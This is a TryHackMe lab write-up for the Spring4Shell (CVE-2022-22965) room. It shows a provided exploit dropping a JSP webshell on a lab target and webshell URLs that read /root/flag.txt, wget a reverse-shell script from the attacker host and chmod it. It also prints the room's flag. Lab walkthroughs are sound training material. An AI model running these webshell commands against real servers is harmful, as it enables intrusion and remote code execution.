---
title: Spring4Shell CVE-2022-22965
author: CYB3RM3
name: CYB3RM3 | Spring4Shell CVE-2022-22965
date: 2022-04-09 13:38:26 +0100
categories: [TryHackMe, CVE]
tags: [CVE]
---

Interactive lab for exploiting Spring4Shell (CVE-2022-22965) in the Java Spring Framework

THM Room [https://tryhackme.com/room/spring4shell](https://tryhackme.com/room/spring4shell)


## TASK 1 : Info - Introduction and Deploy
### Deploy the target machine by clicking the green button at the top of this task!
No Answer

## TASK 2 : Tutorial - Vulnerability Background
### Read the task information and understand how Spring4Shell works at a high level.
No Answer

## TASK 3 : Practical - Exploitation
### Follow the steps in the task to exploit Spring4Shell and obtain a webshell.
First i copied the exploit in a folder "spring" and curl the vulnerable URL :

```console
root@ip-10-10-173-13:~/spring#cp /root/Rooms/Spring4Shell/exploit.py .
root@ip-10-10-173-13:~/spring# curl http://10.10.69.218/
<!DOCTYPE HTML>
<html>
 <head> 
 <title>Vulnerable</title>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
 <script src="/assets/js/font-awesome.js"></script>
 <link rel="icon" type="image/png" href="/assets/favicon.png" />
 <link href="/assets/css/styles.css" rel="stylesheet" />
 </head>
 <body>
 <!-- Masthead-->
 <div class="masthead">
 <div class="masthead-content text-white">
 <div class="container-fluid px-4 px-lg-0">
 <h1 class="fst-italic lh-1 mb-4">Our Website is Coming Soon</h1>
 <p class="mb-5">We're working hard to finish the development of this site. Sign up below to receive updates and to be notified when we launch!</p>
 <form id="contactForm" action="/" method="post">
 <!-- Email address input-->
 <div class="row input-group-newsletter">
 <div class="col"><input class="form-control" required type="email" placeholder="Enter email address..." aria-label="Enter email address..." id="email" name="email" value="" /></div>
 <div class="col-auto"><button class="btn btn-primary" id="submitButton" type="submit">Notify Me!</button></div>
 </div>
 </form>
 </div>
 </div>
 </div>
 <div class="social-icons">
 <div class="d-flex flex-row flex-lg-column justify-content-center align-items-center h-100 mt-3 mt-lg-0">
 <a class="btn btn-dark m-3" target="_blank" href="https://twitter.com/MuirlandOracle"><i class="fab fa-twitter"></i></a>
 <a class="btn btn-dark m-3" target="_blank" href="https://github.com/MuirlandOracle"><i class="fab fa-github"></i></a>
 <a class="btn btn-dark m-3" target="_blank" href="https://www.linkedin.com/in/agcyber/"><i class="fab fa-linkedin"></i></a>
 </div>
 </div>
 <!-- Bootstrap core JS-->
 <script src="/assets/js/bootstrap.bundle.min.js"></script>
 </body>
</html>
```
{: .nolineno }

We can see the action on the form is "/" so the target URL will be using for the exploit is http://10.10.69.218/

```console
root@ip-10-10-173-13:~/spring# ./exploit.py http://10.10.69.218/Shell Uploaded Successfully!
Your shell can be found at: http://10.10.69.218/tomcatwar.jsp?pwd=thm&cmd=whoami
```
{: .nolineno }

Opening this URL and changing the "whoami" by "id" gives me :

![Whoami](/images/thm/spring4shell/spring4shell_1.png)
_Whoami_

No Answer.

### [Bonus Question: Optional] Use your webshell to obtain a reverse/bind shell on the target.

No Answer.

###  What is the flag in /root/flag.txt?

2 method here. First from the original exploit and print the flag :

```console
http://10.10.69.218/tomcatwar.jsp?pwd=thm&cmd=cat%20/root/flag.txt
```
{: .nolineno }

![Flag.txt](/images/thm/spring4shell/spring4shell_2.png)
_Flag.txt_

Or from the reverse shell :

I created some reverses shell on the attacker machine then run a http python server to retreive them on the target machine.

First i need to urlencode my cmd payload :

```console
http://10.10.85.199/tomcatwar.jsp?pwd=thm&cmd=wget http://10.10.173.13:8000/reverse.sh -o /tmp/reverse.sh
```
{: .nolineno }

to 

```console
http://10.10.85.199/tomcatwar.jsp?pwd=thm&cmd=wget%20http://10.10.173.13:8000/reverse.sh%20-o%20/tmp/reverse.sh
```
{: .nolineno }

Then change the file to make it executable :

```console
http://10.10.85.199/tomcatwar.jsp?pwd=thm&cmd=chmod%20777%20/tmp/reverse.sh
```
{: .nolineno }

Let's take a look a the /tmp directory :

![/tmp](/images/thm/spring4shell/spring4shell_3.png)
_/tmp_

I tried with different types of reverse shell but none of them executed well.

I got no better result using CURL.

Answer : THM{NjAyNzkyMjU0MzA1ZWMwZDdiM2E5YzFm} 

## TASK 4 : Info - Conclusion 
### I understand and can abuse Spring4Shell!
No Answer.

